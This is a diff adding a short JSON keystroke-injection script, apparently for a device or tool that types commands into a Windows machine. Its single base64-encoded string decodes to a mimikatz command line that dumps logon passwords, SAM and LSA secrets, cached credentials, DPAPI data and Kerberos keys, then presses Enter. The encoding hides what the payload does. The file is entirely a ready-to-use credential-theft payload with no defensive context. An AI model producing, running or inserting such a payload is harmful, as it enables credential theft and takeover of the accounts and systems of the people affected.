@@ -1,0 +1,5 @@
+[
+	{"send-string-b64":"LlxtaW1pa2F0ei5leGUgInByaXZpbGVnZTo6ZGVidWciICJzZWt1cmxzYTo6ZHBhcGkiICJ0b2tlbjo6ZWxldmF0ZSIgInNla3VybHNhOjpsb2dvbnBhc3N3b3JkcyIgImxzYWR1bXA6OmxzYSAvaW5qZWN0IiAibHNhZHVtcDo6c2FtIiAibHNhZHVtcDo6Y2FjaGUiICJzZWt1cmxzYTo6ZWtleXMiICJleGl0Ig=="},
+	{"send-key":"Enter"},
+	{"sleep":"1"}
+]
